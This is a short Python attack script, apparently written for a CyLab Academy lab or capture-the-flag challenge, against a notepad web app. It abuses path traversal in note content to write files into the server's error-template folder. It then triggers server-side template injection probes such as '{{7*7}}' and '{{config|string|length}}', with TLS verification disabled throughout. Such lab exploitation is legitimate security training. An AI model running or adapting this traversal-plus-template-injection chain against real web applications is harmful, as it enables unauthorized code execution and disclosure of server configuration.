import sys, requests, re, html as H
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})


def go(tpl, label):
    content = "\\..\\templates\\errors\\z" + tpl
    r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"/static/(.+?)\.html$", loc)
    if not m:
        print(f"{label}: POST echec", loc[:120])
        return None
    full = m.group(1)
    name = full.split("/")[-1]        # nom complet avec token
    print(f"\n{label}: nom='{name}'")
    rr = S.get(BASE + "/", params={"error": name}, timeout=25, verify=False)
    txt = H.unescape(rr.text)
    after = txt.split("</h3>", 1)[-1]
    vis = after.split("<h2>")[0].strip()
    print(f"  rendu ({len(vis)} o): {vis[:200]!r}")
    return vis


go("{{7*7}}", "simple 7*7")
go("{{config|string|length}}", "longueur")
go("{{range(3)|list}}", "range")
